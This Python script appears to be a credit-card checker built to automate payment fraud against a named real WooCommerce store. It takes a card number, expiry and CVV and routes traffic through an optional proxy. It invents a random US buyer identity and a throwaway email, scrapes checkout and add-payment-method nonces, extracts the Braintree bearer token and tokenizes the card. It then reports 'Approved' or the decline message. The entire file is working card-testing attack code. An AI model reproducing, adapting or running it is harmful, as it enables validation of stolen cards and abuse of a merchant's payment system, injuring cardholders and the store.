import aiohttp
import uuid
import urllib.parse
from aiohttp_socks.connector import ProxyConnector
import base64
import asyncio

def braintree_generate_uuid():
    return str(uuid.uuid4())

def braintree_generate_correlation_id():
    return str(uuid.uuid4())

async def user_random():
    async with aiohttp.ClientSession() as session:
        async with session.get("https://randomuser.me/api/1.2/?nat=US") as response:
            user = await response.text()
            street = user.split('"street":"')[1].split('"')[0]
            city = user.split('"city":"')[1].split('"')[0]
            state = user.split('"state":"')[1].split('"')[0]
            zipcode = user.split('"postcode":')[1].split(',')[0]
            phone = user.split('"phone":"')[1].split('"')[0]
            name = user.split('"first":"')[1].split('"')[0]
            last = user.split('"last":"')[1].split('"')[0]

            state_mappings = {
                "Alabama": "AL", "Alaska": "AK", "Arizona": "AZ", "Arkansas": "AR",
                "California": "CA", "Colorado": "CO", "Connecticut": "CT", "Delaware": "DE",
                "Florida": "FL", "Georgia": "GA", "Hawaii": "HI", "Idaho": "ID",
                "Illinois": "IL", "Indiana": "IN", "Iowa": "IA", "Kansas": "KS",
                "Kentucky": "KY", "Louisiana": "LA", "Maine": "ME", "Maryland": "MD",
                "Massachusetts": "MA", "Michigan": "MI", "Minnesota": "MN", "Mississippi": "MS",
                "Missouri": "MO", "Montana": "MT", "Nebraska": "NE", "Nevada": "NV",
                "New Hampshire": "NH", "New Jersey": "NJ", "New Mexico": "NM", "New York": "NY",
                "North Carolina": "NC", "North Dakota": "ND", "Ohio": "OH", "Oklahoma": "OK",
                "Oregon": "OR", "Pennsylvania": "PA", "Rhode Island": "RI", "South Carolina": "SC",
                "South Dakota": "SD", "Tennessee": "TN", "Texas": "TX", "Utah": "UT",
                "Vermont": "VT", "Virginia": "VA", "Washington": "WA", "West Virginia": "WV",
                "Wisconsin": "WI", "Wyoming": "WY"
            }

            state = state_mappings.get(state.capitalize(), "NY")

            await session.close()
            return street, city, state, zipcode, phone, name, last


async def braintree_auth6x(cc, mes, ano, cvv, proxy=None):

    proxie = ProxyConnector.from_url(proxy) if proxy else None
    session = aiohttp.ClientSession(connector=proxie)

    street, city, state, zipcode, phone, name, last = await user_random()
    email = uuid.uuid4().hex[:8] + '@gmail.com'
    email = urllib.parse.quote(email)   
    
    # ////! -------------- Request 1 -------------- ////!
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'es-419,es;q=0.8',
        'cache-control': 'no-cache',
        'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryeRpVtd2JE2z6B0bu',
        'origin': 'https://store.animationresources.org',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://store.animationresources.org/product/commercial-reel-assorted-spots/',
        'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'sec-gpc': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }

    data = '------WebKitFormBoundaryeRpVtd2JE2z6B0bu\r\nContent-Disposition: form-data; name="quantity"\r\n\r\n1\r\n------WebKitFormBoundaryeRpVtd2JE2z6B0bu\r\nContent-Disposition: form-data; name="add-to-cart"\r\n\r\n232\r\n------WebKitFormBoundaryeRpVtd2JE2z6B0bu\r\nContent-Disposition: form-data; name="wc_braintree_paypal_amount"\r\n\r\n5.00\r\n------WebKitFormBoundaryeRpVtd2JE2z6B0bu\r\nContent-Disposition: form-data; name="wc_braintree_paypal_currency"\r\n\r\nUSD\r\n------WebKitFormBoundaryeRpVtd2JE2z6B0bu\r\nContent-Disposition: form-data; name="wc_braintree_paypal_locale"\r\n\r\nen_us\r\n------WebKitFormBoundaryeRpVtd2JE2z6B0bu\r\nContent-Disposition: form-data; name="wc_braintree_paypal_single_use"\r\n\r\n1\r\n------WebKitFormBoundaryeRpVtd2JE2z6B0bu\r\nContent-Disposition: form-data; name="wc_braintree_paypal_needs_shipping"\r\n\r\n\r\n------WebKitFormBoundaryeRpVtd2JE2z6B0bu\r\nContent-Disposition: form-data; name="wc_braintree_paypal_product_id"\r\n\r\n232\r\n------WebKitFormBoundaryeRpVtd2JE2z6B0bu--\r\n'

    req1 = await session.post('https://store.animationresources.org/product/commercial-reel-assorted-spots/', headers=headers, data=data)
    r1 = await req1.text()
    

    # ////! -------------- Request 2 -------------- ////
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'es-419,es;q=0.8',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://store.animationresources.org/product/commercial-reel-assorted-spots/',
        'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'sec-gpc': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }

    req2 = await session.get('https://store.animationresources.org/checkout/', headers=headers)
    r2 = await req2.text()
    checknonce = r2.split('name="woocommerce-process-checkout-nonce" value="')[1].split('"')[0]
    admintok = r2.split('"client_token_nonce":"')[1].split('"')[0]


    # ////! -------------- Request 3 -------------- ////

    headers = {
        'accept': '*/*',
        'accept-language': 'es-419,es;q=0.8',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://store.animationresources.org',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://store.animationresources.org/checkout/',
        'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-gpc': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'action': 'wc_braintree_credit_card_get_client_token',
        'nonce': admintok,
    }

    req3 = await session.post(
        'https://store.animationresources.org/wp-admin/admin-ajax.php',
        headers=headers,
        data=data,
    )
    r3 = await req3.text()

    b3tok = r3.split('"data":"')[1].split('"')[0]
    bearer = base64.b64decode(b3tok).decode('utf-8')
    bearer = bearer.split('"authorizationFingerprint":"')[1].split('"')[0] 

    headers = {
        'accept': '*/*',
        'accept-language': 'es-419,es;q=0.8',
        'authorization': f'Bearer {bearer}',
        'braintree-version': '2018-05-10',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'sec-gpc': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': braintree_generate_uuid(),
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': cc,
                    'expirationMonth': mes,
                    'expirationYear': ano,
                    'cvv': cvv,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    req4 = await session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    r4 = await req4.text()
    token = r4.split('"token":"')[1].split('"')[0]


    # ////! -------------- Request 5 -------------- ////

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'es-419,es;q=0.8',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://store.animationresources.org',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://store.animationresources.org/checkout/',
        'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-gpc': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'wc-ajax': 'checkout',
    }

    data = f'billing_first_name={name}&billing_last_name={last}&billing_country=US&billing_state={state}&billing_postcode={zipcode}&billing_email={email}&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fstore.animationresources.org%2Fproduct%2Fcommercial-reel-assorted-spots%2F&wc_order_attribution_session_start_time=2024-04-18+14%3A57%3A32&wc_order_attribution_session_pages=2&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F124.0.0.0+Safari%2F537.36&payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=master-card&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=5.00&wc_braintree_credit_card_payment_nonce={token}&wc_braintree_device_data=%7B%22correlation_id%22%3A%223af059f8349eef3fc21b2f1b0942c5c5%22%7D&wc-braintree-credit-card-tokenize-payment-method=true&wc_braintree_paypal_payment_nonce=&wc_braintree_device_data=%7B%22correlation_id%22%3A%223af059f8349eef3fc21b2f1b0942c5c5%22%7D&wc-braintree-paypal-context=shortcode&wc_braintree_paypal_amount=5.00&wc_braintree_paypal_currency=USD&wc_braintree_paypal_locale=en_us&woocommerce-process-checkout-nonce={checknonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'

    req5 = await session.post('https://store.animationresources.org/', params=params, headers=headers, data=data)
    r5 = await req5.text()


    # ////! -------------- Request 6 -------------- ////
    
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'es-419,es;q=0.8',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'sec-gpc': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }

    req6 = await session.get('https://store.animationresources.org/my-account/add-payment-method/', headers=headers)
    r6 = await req6.text()

    paynonce = r6.split('name="woocommerce-add-payment-method-nonce" value="')[1].split('"')[0]
    admintok = r6.split('"client_token_nonce":"')[1].split('"')[0]


    # ////! -------------- Request 7 -------------- ////

    headers = {
        'accept': '*/*',
        'accept-language': 'es-419,es;q=0.8',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://store.animationresources.org',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://store.animationresources.org/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-gpc': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'action': 'wc_braintree_credit_card_get_client_token',
        'nonce': admintok,
    }

    req7 = await session.post(
        'https://store.animationresources.org/wp-admin/admin-ajax.php',
        headers=headers,
        data=data,
    )
    r7 = await req7.text()

    b3tok = r7.split('"data":"')[1].split('"')[0]
    bearer = base64.b64decode(b3tok).decode('utf-8')
    bearer = bearer.split('"authorizationFingerprint":"')[1].split('"')[0] 


    # ////! -------------- Request 8 -------------- ////

    headers = {
        'accept': '*/*',
        'accept-language': 'es-419,es;q=0.8',
        'authorization': f'Bearer {bearer}',
        'braintree-version': '2018-05-10',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'sec-gpc': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': braintree_generate_uuid(),
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': cc,
                    'expirationMonth': mes,
                    'expirationYear': ano,
                    'cvv': cvv,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    req8 = await session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    r8 = await req8.text()
    token = r8.split('"token":"')[1].split('"')[0]


    # ////! -------------- Request 9 -------------- ////

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'es-419,es;q=0.8',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://store.animationresources.org',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://store.animationresources.org/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'sec-gpc': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }

    data = [
        ('payment_method', 'braintree_credit_card'),
        ('wc-braintree-credit-card-card-type', 'visa'),
        ('wc-braintree-credit-card-3d-secure-enabled', ''),
        ('wc-braintree-credit-card-3d-secure-verified', ''),
        ('wc-braintree-credit-card-3d-secure-order-total', '5.00'),
        ('wc_braintree_credit_card_payment_nonce', token),
        ('wc_braintree_device_data', '{"correlation_id":"'+braintree_generate_correlation_id()+'"}'),
        ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
        ('wc_braintree_paypal_payment_nonce', ''),
        ('wc_braintree_device_data', '{"correlation_id":"'+braintree_generate_correlation_id()+'"}'),
        ('wc-braintree-paypal-context', 'shortcode'),
        ('wc_braintree_paypal_amount', '5.00'),
        ('wc_braintree_paypal_currency', 'USD'),
        ('wc_braintree_paypal_locale', 'en_us'),
        ('wc-braintree-paypal-tokenize-payment-method', 'true'),
        ('woocommerce-add-payment-method-nonce', paynonce),
        ('_wp_http_referer', '/my-account/add-payment-method/'),
        ('woocommerce_add_payment_method', '1'),
    ]

    req9 = await session.post(
        'https://store.animationresources.org/my-account/add-payment-method/',
        headers=headers,
        data=data,
    )

    r9 = await req9.text()
    
    await session.close()

    if 'New payment method added' in r9: 
        print("Aprovved")
        return "Approved"
    else: 
        mensaje = r9.split('<ul class="woocommerce-error" role="alert">')[1].split('</li>')[0] 
        mensaje = mensaje.split('<li>')[1].strip() 
        return mensaje

